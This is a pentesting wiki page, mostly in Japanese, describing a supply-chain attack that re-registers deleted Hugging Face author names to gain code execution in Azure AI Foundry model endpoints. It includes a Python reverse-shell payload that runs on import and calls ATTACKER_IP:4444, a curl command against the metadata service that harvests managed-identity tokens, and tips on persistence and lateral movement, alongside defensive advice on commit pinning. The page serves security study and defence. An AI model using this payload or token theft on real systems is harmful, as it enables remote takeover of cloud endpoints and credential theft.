# Azure - AI Foundry Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## シナリオ

- Azure AI Foundry Model Catalog にはワンクリックでデプロイ可能な Hugging Face (HF) モデルが多数含まれています。
- HF のモデル識別子は Author/ModelName です。HF の author/org が削除されると、誰でもその author を再登録して同じ ModelName のモデルを legacy path に公開できます。
- 名前だけで取得する pipelines や catalogs（コミットのピン留め/整合性がない場合）は攻撃者管理のリポジトリに解決されます。Azure がモデルをデプロイすると、loader code がエンドポイント環境で実行され、そのエンドポイントの権限で RCE を得る可能性があります。

一般的な HF の乗っ取りケース:
- 所有権の削除: 旧パスは乗っ取られるまで 404 になります。
- 所有権の移転: 旧著者が存在する間は旧パスが新しい author へ 307 リダイレクトします。もし旧著者が後に削除され再登録されると、リダイレクトは壊れ、攻撃者のリポジトリが旧パスで配信されます。

## 再利用可能な名前空間の特定 (HF)
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>        # 200 exists, 404 deleted/available

# Check model path
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 -> redirect (transfer case), 404 -> deleted until takeover
```
## Azure AI Foundry に対するエンドツーエンドの攻撃フロー

1) Model Catalogで、HF上で元のAuthorが削除または移管（旧Authorが削除）されたHFのモデルを見つける。  
2) HFで放棄されたAuthorを再登録し、ModelNameを再作成する。  
3) import時に実行される、またはtrust_remote_code=Trueを必要とするloaderコードを含む悪意あるrepoを公開する。  
4) Azure AI FoundryからレガシーのAuthor/ModelNameをデプロイする。プラットフォームが攻撃者のrepoをプルし、loaderがAzureのendpointのcontainer/VM内で実行され、endpoint権限でRCEを引き起こす。

Example payload fragment executed on import (for demonstration only):
```python
# __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # or powershell on Windows images

if os.environ.get("AZUREML_ENDPOINT","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
注意事項
- AI Foundry を統合する HF ベースのデプロイは通常、モデルの config で参照される repo モジュール（例: auto_map）をクローンしてインポートします。これによりコード実行が発生する可能性があります。いくつかのパスでは trust_remote_code=True が必要です。
- アクセス権は通常、エンドポイントの managed identity/service principal の権限に合わせられます。これをデータ取得や Azure 内での横移動を行うための初期アクセスの足がかりとして扱ってください。

## ポストエクスプロイトのヒント (Azure Endpoint)

- トークン取得のために環境変数とMSIエンドポイントを列挙する:
```bash
# Azure Instance Metadata Service (inside Azure compute)
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
- 取得したトークンでマウントされたストレージ、モデルアーティファクト、および到達可能な Azure サービスを確認する。
- プラットフォームがHFから再プルする場合は、毒入りのモデルアーティファクトを残して永続化を図ることを検討する。

## Azure AI Foundry ユーザー向けの防御ガイダンス

- HF からロードする際はコミットでモデルを固定する:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- 検証済みの HF モデルを信頼できる内部レジストリにミラーし、そこからデプロイする。
- コードベースや defaults/docstrings/notebooks を継続的にスキャンし、削除／移管されたハードコーディング済みの Author/ModelName を検出して更新またはピン留めする。
- デプロイ前に作者の存在とモデルの出所を検証する。

## 認識ヒューリスティクス (HTTP)

- 削除された作者: 作者ページが 404；レガシーモデルのパスも takeover まで 404 になる。
- 移管されたモデル: 旧作者が存在する間、レガシーパスが 307 で新しい作者へリダイレクトされる；もし旧作者が後で削除され再登録されると、レガシーパスが攻撃者のコンテンツを配信する。
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## 相互参照

- より包括的な方法論およびサプライチェーンに関する注記を参照してください：

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## 参考文献

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
